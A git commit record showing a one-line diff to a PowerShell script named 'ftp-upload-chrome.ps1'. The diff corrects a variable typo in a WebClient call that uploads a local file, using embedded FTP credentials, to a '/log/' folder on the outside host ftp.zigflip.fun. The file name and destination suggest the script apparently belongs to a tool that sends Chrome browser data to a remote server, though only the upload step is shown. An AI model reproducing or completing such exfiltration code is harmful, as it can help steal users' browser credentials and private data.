2fc7c356acf23a8cd5e46f65eae41b8fee065d26
LittleZiG <fgtbg@yahoo.fr>
2024-01-03 00:23:45 +0100

    Update ftp-upload-chrome.ps1

--- ftp-upload-chrome.ps1
+++ ftp-upload-chrome.ps1
@@ -13,7 +13,7 @@ function ftp-upload {
         $webClient = New-Object System.Net.WebClient
         $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
         
-        $webClient.UploadFile("ftp://ftp.zigflip.fun/log/" + $outpuFile, $fileupload)
+        $webClient.UploadFile("ftp://ftp.zigflip.fun/log/" + $outputFile, $fileupload)
 
         Write-Host "Le fichier a été uploadé avec succès."
     }
